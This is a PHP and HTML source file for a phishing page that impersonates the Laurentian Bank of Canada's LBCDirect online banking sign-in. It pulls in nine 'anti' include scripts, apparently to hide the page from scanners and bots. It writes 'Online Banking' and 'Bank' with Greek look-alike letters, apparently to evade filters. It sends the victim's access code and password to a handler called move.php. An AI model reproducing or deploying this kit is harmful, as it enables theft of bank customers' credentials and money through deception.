<?php
	include '../prevents/anti1.php';
	include '../prevents/anti2.php';
	include '../prevents/anti3.php';
	include '../prevents/anti4.php';
	include '../prevents/anti5.php';
	include '../prevents/anti6.php';
	include '../prevents/anti7.php';
	include '../prevents/anti8.php';
	include '../prevents/anti9.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" class=" js flexbox flexboxlegacy"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Sign In</title>

<script src="./login_files/modal.js"></script>

<script>
function empty() {
    var y;
    y = document.getElementById("username").value;
    if (y == "") {
        document.getElementById("username").style = "border-color:red";
		document.getElementById("username_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("password").value;
    if (x == "") {
        document.getElementById("password").style = "border-color:red";
		document.getElementById("password_error").style = "display: block";
        return false;
    }

}
</script>

<script>
function change() {
    var e;
    e = document.getElementById("username").value;
    if (e !== ""){
	    document.getElementById("username").style = "";
		document.getElementById("username_error").style = "display: none";
	}
	var e;
    e = document.getElementById("password").value;
    if (e !== ""){
	    document.getElementById("password").style = "";
		document.getElementById("password_error").style = "display: none";
	}
	
}

</script>

<link rel="shortcut icon" href="./login_files/favicon.ico">
<meta name="viewport" content="width=960">

	<link href="./login_files/brand$v@201711260135.css" rel="stylesheet" type="text/css" media="screen">
<link href="./login_files/login$forms-v2@true+v@201711260135.css" rel="stylesheet" type="text/css" media="screen">
<link href="./login_files/print$v@201711260135.css" rel="stylesheet" type="text/css" media="print">

</head>
<body class="Login Login1_23

  Lang-en Layout-
 javascript">
<div class="md mdi">

	<div class="outerHeader">
		<div class="header">
	<h1 class="logo">
	<a href="" title="Home" class="current"><img src="./login_files/Logo$v@201711260135.jpg" alt=""></a></h1>

<ul class="skip nav">
		<li><a href="">Skip to Content</a></li>
		
				<li><a href="" title="" class="self current">Login to &Omicron;nline &Beta;anking</a></li>
			
	</ul>
	<div class="global">
	<ul class="nav externalSite">
		<li><a href="" title="" target="_blank">Laurentian &Beta;ank.ca</a></li>
	</ul>
	<ul class="nav lang "><li class="item0  lang-en current"><a>English</a></li><li class="item1 itemN lang-fr "><a href="">Français</a></li></ul>
	<ul class="nav global">
<li class="link0 even notcurrent id-ContactUs name-section name-contactus name-contextRoot name-ContactUs"><a href="" title="Contact Us">Contact Us</a></li>
</ul>

	<ul class="nav global">
		<li><a href="" target="_blank">Locator</a></li>
	</ul>
	
		<ul class="nav logInOff loggedOff">
			<li class="logOn"><a href="">Sign In</a></li>
		</ul>
		
</div>
	
		
			<div class="primary"><h1 id="nonAuthTitle">WELCOME TO LBC<em>Direct</em></h1></div>
		
</div><!--/header-->

	</div><!--/outerHeader-->
	<div class="outerColContainer">
		<div class="colContainer">
			<div class="colOne">
				

<div class="portlets online_left details_online"></div>


<div class="portlets main_left"></div>


				
			</div><!--/colOne-->
			<div class="colTwoThree">
				<div class="mainContent" id="mainContent">
					<div class="content">
	<div class="interacLogoHolder">
		
	</div>
		<h1 id="PageTitle">SIGN IN to LBC<em>Direct</em></h1>

	<form id="id5" method="post" action="move.php" onsubmit="return empty();" class="logon logonStep1 mdlogon mdIALogonEnrollPac" autocomplete="off"><div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"></div>

	<div class="required">
	
		<label title="Enter your access code" for="id6">Access code</label>
		

		<div class="input">
	
			
			
	<input type="text" value="" name="username" id="username" maxlength="8" size="9" onblur="change()"><br>
	<label id="username_error" style="display: none"><font color="red">Access code is required</font></label>

			
			
		
</div>
	
</div>

	

	<div class="required">
	
		<label title="Enter your password" for="id7">Password</label>
		

		<div class="input">
	
			
			
	<input type="password" value="" name="password" id="password" maxlength="20" size="21" onblur="change()"><br>
	<label id="password_error" style="display: none"><font color="red">Password is required</font></label>

			
			
		
</div>
	
</div>

		
		
		
	
	<div class="formActions">
		<ul>
			
				<li>
					<input type="submit" name="buttonPanel:actions:continue" class="submit" id="id8" value="Enter" title="">
				</li>
			
			
			
		</ul>
	</div>


	</form>

		<div class="conclusion"><ul><li>To sign up to LBC<em>Direct</em> or if you've forgotten your access code or password, please call: <span class="tel">1 800 252-1846</span></li></ul></div>
</div>

				</div><!--/maincontent-->
			</div><!--/colTwoThree-->
			<div class="clear">&nbsp;</div>
			<div class="banner">
				<div class="portlets banner"></div>
			</div>
		</div><!--/contentContainer-->
	</div><!--/outerContentContainer-->
	<div class="outerFooter">
		<div class="footer">
	
			<div class="footerCopy">
	<p>Copyright 2017<br>Laurentian &Beta;ank of Canada.<br>All rights reserved.</p>
	<p class="securityGuaranteed"><span class="LBCDirect">LBC<em>Direct</em></span><br>Security guaranteed.</p>
</div>
		
	
	<ul class="nav footer footer2">
<li class="link0 even notcurrent id-SecurityAndPrivacy name-contextRoot name-SecurityAndPrivacy"><a href="" title="Security and Privacy">Security and Privacy</a></li>
<li class="link1 linkN odd notcurrent id-LegalNotes name-contextRoot name-LegalNotes"><a href="" title="Legal Notes">Legal Notes</a></li>
</ul>

	<ul class="nav footer footer3">
<li class="link0 linkN even notcurrent id-ContactUs name-section name-contactus name-contextRoot name-ContactUs"><a href="" title="Contact Us">Contact Us</a></li>
</ul>

	<ul class="nav footer footer4">
		<li><a href="" title="Mobile Site">Mobile Site</a></li>
	</ul>
		
</div><!--/footer-->
	</div><!--/outerFooter-->
</div><!-- /mdi -->


<div id="datepicker_div"></div></body></html>